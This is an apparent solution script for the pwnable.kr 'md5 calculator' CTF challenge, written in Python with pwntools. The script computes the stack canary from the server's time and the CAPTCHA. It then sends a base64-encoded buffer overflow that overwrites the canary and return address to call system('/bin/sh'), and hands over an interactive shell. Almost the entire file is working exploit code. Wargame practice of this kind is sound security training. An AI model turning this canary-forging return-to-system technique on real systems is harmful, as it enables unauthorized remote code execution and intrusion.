import struct
import socket
import time
import os
import base64
from pwn import *

USER = 'fix'
PASSWORD = 'guest'
IP = 'pwnable.kr'
#IP = '127.0.0.1'
PORT = 2222
MD5_IP = '127.0.0.1'
MD5_PORT = 9002
CHUNK = 1024

SYSTEM_ADDR = 0x08049187
EXIT_ADDR = 0x0804b078
G_BUF_ADDR = 0x0804b0e0
PROCESSHASH_ADDR = 0x08048F92

# Handle negative numbers representation
def switchSign (num):

	return num & 0xffffffff

def main():

	# context.log_level = 'debug'
	conn = ssh ('fix', IP, port = PORT, password = PASSWORD)
	proc = conn.process ('date +%s', shell=True)
	systemTime = proc.recvline().strip('\n')
	proc.close()
	print ("system time : {}".format (systemTime))

	p = conn.connect_remote (MD5_IP, MD5_PORT)


	# Welcome message
	data = p.recvline ()
	print (data)
	# CAPTCHA
	data = p.recvline ()
	print (data)
	CAPTCHA = int (data.split(' ')[-1])
	# create canary
	CAPTCHA = str (CAPTCHA)

	randProcess = process (['./craftCanary', CAPTCHA, str(systemTime)])
	# check this strip
	canaryValue = int(randProcess.recvall(timeout = 1).strip())
	if canaryValue < 0:
		canaryValue += 4294967296
	print ("the canary is:")
	print (canaryValue)
	
	message = ''
	message += 'A' * 512  # padding
	message += struct.pack ("<I", switchSign(canaryValue))
	message += 'A' * 12 # overwrite 4_bytes, ebx, ebp
	message += struct.pack ("<I", SYSTEM_ADDR)
	BIN_SH_ADDR = 0x0804B3AC # we locate /bin/sh at the end of the written payload
	message += struct.pack ("<I", BIN_SH_ADDR)
	payload = base64.b64encode (message)
	payload += '/bin/sh\x00' # its in .BSS, already null terminated :)	


	p.sendline (CAPTCHA)
	

	p.sendline (payload)
	
	# Authenticated message
	p.recvuntil("MD5")
	# Encode BASE64 message
	p.recvline(timeout=1)
	
	p.interactive()

	return
	

if __name__ == '__main__':
	main()